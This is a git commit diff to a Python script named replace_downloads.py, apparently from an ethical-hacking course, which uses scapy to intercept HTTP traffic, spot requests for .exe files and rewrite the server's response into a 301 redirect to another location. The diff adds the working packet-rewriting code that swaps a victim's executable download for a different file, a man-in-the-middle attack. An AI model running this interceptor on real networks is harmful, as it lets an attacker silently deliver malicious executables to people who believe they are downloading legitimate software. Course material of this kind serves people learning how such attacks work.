335226a9dee62eb9998d79a35885e255b9a86ca5
SauravJalui <sauravjalui.007@gmail.com>
2020-08-29 19:24:04 +0530

    added modifying http responses code

--- 7. Writing a File Interceptor/replace_downloads.py
+++ 7. Writing a File Interceptor/replace_downloads.py
@@ -13,13 +13,20 @@ def process_packet(packet):
             if ".exe" in scapy_packet[scapy.Raw].load:
                 print("[+] exe request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
-                print(scapy_packet.show())
+                
 
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[-] replacing file")
-            print(scapy_packet.show())
+
+                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp\n\n"
+                
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.TCP].len
+
+                packet.set_payload(str(scapy_packet))
 
     packet.accept()
 
